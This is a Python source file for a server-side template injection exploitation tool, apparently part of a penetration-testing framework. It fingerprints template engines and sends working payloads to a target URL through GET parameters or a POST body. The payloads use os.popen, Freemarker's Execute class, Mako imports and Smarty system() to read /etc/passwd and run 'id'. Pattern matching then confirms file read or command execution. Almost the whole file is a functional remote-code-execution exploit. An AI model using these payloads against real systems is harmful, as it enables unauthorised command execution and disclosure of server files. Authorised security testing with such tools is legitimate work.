"""
SSTI_EXPLOIT -- Server-Side Template Injection exploitation.

Goes beyond nuclei detection with:
  1. Engine fingerprinting (Jinja2, Twig, Freemarker, Mako, Smarty, Slim)
  2. Expression evaluation ({7*7}, ${7*7}, <%= 7*7 %>)
  3. Context-aware payload injection (GET params, headers, POST body)
  4. File read proof (/etc/passwd via template functions)
  5. Command execution proof (id whoami via os.popen/system)

Pure Python + requests.  Non-destructive: reads /etc/passwd, runs id/whoami only.
"""

import re

import requests

from tools.attack.verdict import confidence_from_criteria, criteria_label
from tools.base import Tool, ToolResult

# ── Engine fingerprint payloads ────────────────────────────────────────────
# Each payload evaluates a math expression. Response containing "49" = engine confirmed.

ENGINE_PROBES = [
    # Jinja2 / Twig (Python)
    ("{{7*7}}", "49", ["jinja2", "twig"]),
    ("${7*7}", "49", ["jinja2"]),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", None, ["jinja2"]),
    # Freemarker (Java)
    ("<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}", None, ["freemarker"]),
    ("${7*7}", "49", ["freemarker"]),
    # Mako (Python)
    ("<% import os %> ${os.popen('id').read()}", None, ["mako"]),
    # Smarty (PHP)
    ("{7*7}", "49", ["smarty"]),
    ("{system('id')}", None, ["smarty"]),
    # Slim (Ruby)
    ("<%= 7*7 %>", "49", ["slim"]),
    # Velocity (Java)
    ("#set($str=$class.inspect('java.lang.String')) ${7*7}", "49", ["velocity"]),
    # Pebble (Java)
    ("{{7*7}}", "49", ["pebble"]),
]

# ── File read payloads per engine ──────────────────────────────────────────

FILE_READ_PAYLOADS = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
        "{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}",
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}",
    ],
    "freemarker": [
        "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('cat /etc/passwd')}",
        "${product.System.getProperty('user.dir')}",
    ],
    "mako": [
        "<% import os %> ${os.popen('cat /etc/passwd').read()}",
    ],
    "smarty": [
        "{system('cat /etc/passwd')}",
        "{php}echo file_get_contents('/etc/passwd');{/php}",
    ],
}

# ── Command execution proof payloads ───────────────────────────────────────

CMD_EXEC_PAYLOADS = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{ lipsum.__globals__['os'].popen('id').read() }}",
    ],
    "freemarker": [
        "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
    ],
    "mako": [
        "<% import os %> ${os.popen('id').read()}",
    ],
    "smarty": [
        "{system('id')}",
    ],
}

# ── Detection patterns ─────────────────────────────────────────────────────

PASSWD_PATTERNS = [
    re.compile(r"root:.+:0:0:"),
    re.compile(r"/bin/(ba)?sh"),
]

CMD_OUTPUT_PATTERNS = [
    re.compile(r"uid=\d+\("),
    re.compile(r"root:x:0:0"),
]


class SSTIExploitTool(Tool):
    """Server-Side Template Injection exploitation."""

    name = "ssti_exploit"
    capability = "SSTI_EXPLOIT"
    binary = ""

    def is_available(self) -> bool:
        return True

    def validate(self):
        return None

    def build_command(self, target: str, **kwargs) -> list:
        return ["python-ssti-exploit", target]

    def parse(self, stdout: str, stderr: str) -> dict:
        return {}

    def run(self, target: str, timeout: int = 30, **kwargs) -> ToolResult:
        base = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        param = kwargs.get("param", "")
        method = kwargs.get("method", "GET").upper()
        headers = kwargs.get("headers", {})
        cookies = kwargs.get("cookies", {})

        all_findings = []

        # Phase 1: Engine fingerprinting
        engine, fingerprint_url, fingerprint_evidence = self._fingerprint_engine(
            base, param, method, headers, cookies, timeout)

        if engine:
            all_findings.append({
                "type": "engine_fingerprint",
                "engine": engine,
                "severity": "HIGH",
                "confidence": 85,
                "url": fingerprint_url,
                "evidence": fingerprint_evidence,
                "description": f"SSTI engine identified: {engine}",
            })

        # Phase 2: File read proof
        if engine and engine in FILE_READ_PAYLOADS:
            for payload in FILE_READ_PAYLOADS[engine][:2]:
                file_result = self._send_payload(
                    base, param, payload, method, headers, cookies, timeout)
                if file_result:
                    body = file_result.get("body", "")
                    for pat in PASSWD_PATTERNS:
                        if pat.search(body):
                            all_findings.append({
                                "type": "file_read",
                                "engine": engine,
                                "severity": "CRITICAL",
                                "confidence": 95,
                                "url": file_result["url"],
                                "evidence": body[:300],
                                "payload": payload[:200],
                                "description": f"SSTI file read via {engine}: /etc/passwd leaked",
                            })
                            break

        # Phase 3: Command execution proof
        if engine and engine in CMD_EXEC_PAYLOADS:
            for payload in CMD_EXEC_PAYLOADS[engine][:2]:
                cmd_result = self._send_payload(
                    base, param, payload, method, headers, cookies, timeout)
                if cmd_result:
                    body = cmd_result.get("body", "")
                    for pat in CMD_OUTPUT_PATTERNS:
                        if pat.search(body):
                            all_findings.append({
                                "type": "command_execution",
                                "engine": engine,
                                "severity": "CRITICAL",
                                "confidence": 98,
                                "url": cmd_result["url"],
                                "evidence": body[:300],
                                "payload": payload[:200],
                                "description": f"SSTI command execution via {engine}: id output confirmed",
                            })
                            break

        # Phase 4: Blind SSTI detection (math evaluation in response)
        if not engine:
            blind_result = self._test_blind_ssti(base, param, method, headers, cookies, timeout)
            if blind_result:
                all_findings.append(blind_result)

        return ToolResult(tool=self.name, status="success", capability=self.capability,
                          results={"ssti_findings": all_findings, "count": len(all_findings),
                                   "engine": engine})

    def _fingerprint_engine(self, base, param, method, headers, cookies, timeout):
        """Test math expression payloads to identify the template engine."""
        for probe_payload, expected_response, engines in ENGINE_PROBES:
            if expected_response is None:
                continue
            result = self._send_payload(
                base, param, probe_payload, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                if expected_response in body:
                    return engines[0], result["url"], body[:200]
        return None, None, None

    def _send_payload(self, base, param, payload, method, headers, cookies, timeout):
        """Send a SSTI payload via the specified parameter and method."""
        try:
            if method == "GET":
                sep = "&" if "?" in base else "?"
                url = f"{base}{sep}{param}={requests.utils.quote(payload)}" if param else base
                r = requests.get(url, timeout=timeout, headers=headers,
                                 cookies=cookies, allow_redirects=True)
            else:
                url = base
                data = {param: payload} if param else {"input": payload}
                r = requests.post(url, timeout=timeout, headers=headers,
                                  cookies=cookies, data=data, allow_redirects=True)

            return {"url": url, "status": r.status_code, "body": r.text[:10000]}
        except requests.RequestException:
            return None

    def _test_blind_ssti(self, base, param, method, headers, cookies, timeout):
        """Test for blind SSTI by comparing response lengths of 7*7 vs 7*8."""
        try:
            if param:
                sep = "&" if "?" in base else "?"
                url_49 = f"{base}{sep}{param}={requests.utils.quote('{{7*7}}')}"
                url_56 = f"{base}{sep}{param}={requests.utils.quote('{{7*8}}')}"
            else:
                return None

            r1 = requests.get(url_49, timeout=timeout, headers=headers, cookies=cookies)
            r2 = requests.get(url_56, timeout=timeout, headers=headers, cookies=cookies)

            # If response lengths differ, the expression is being evaluated
            if abs(len(r1.text) - len(r2.text)) > 5 and r1.status_code == r2.status_code:
                met = ["differential_eval"]
                return {
                    "type": "blind_ssti",
                    "engine": "unknown",
                    "severity": "HIGH",
                    "confidence": confidence_from_criteria(
                        met, {"differential_eval": 30}),
                    "proof_criteria": met + [{"note": "response differs between {{7*7}} and {{7*8}}"}] ,
                    "url": base,
                    "evidence": f"Response length diff: {len(r1.text)} vs {len(r2.text)}",
                    "description": "Blind SSTI detected: math expression evaluation causes response difference",
                }
        except requests.RequestException:
            pass
        return None
